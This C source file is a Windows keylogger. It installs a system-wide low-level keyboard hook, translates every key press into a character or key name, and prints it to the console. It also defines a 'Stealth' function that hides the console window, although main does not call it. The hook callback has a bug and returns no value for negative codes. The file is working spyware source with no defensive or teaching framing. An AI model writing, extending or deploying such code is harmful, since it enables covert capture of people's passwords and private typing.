#include <stdio.h>
#include <windows.h>
#include <winuser.h>

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

HHOOK hHook;

void PrintKeyName(DWORD vkCode)
{
    BYTE keyState[256];
    WCHAR keyName[2] = {0};
    UINT mappedVirtualKey = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    GetKeyboardState(keyState);

    SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
    if (shiftState & 0x8000)
    {
        keyState[VK_SHIFT] = 0x80;
    }

    int result = ToUnicodeEx(vkCode, mappedVirtualKey, keyState, keyName, sizeof(keyName) / sizeof(WCHAR), 0, GetSystemDefaultLangID());

    if (result > 0)
    {
        printf("Character: %c\n", keyName[0]);
    }
    else
    {
        TCHAR keyNameText[256];
        int textResult = GetKeyNameText(mappedVirtualKey << 16, keyNameText, sizeof(keyNameText) / sizeof(TCHAR));

        if (textResult > 0)
        {
            printf("key name: %s\n", keyNameText);
        }
        else
        {
            printf("Error on key mapping :P.\n");
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKeyboard->vkCode;
            PrintKeyName(vkCode);
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }
}

int main()
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    if (hHook == NULL)
    {
        printf("Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);

    return 0;
}
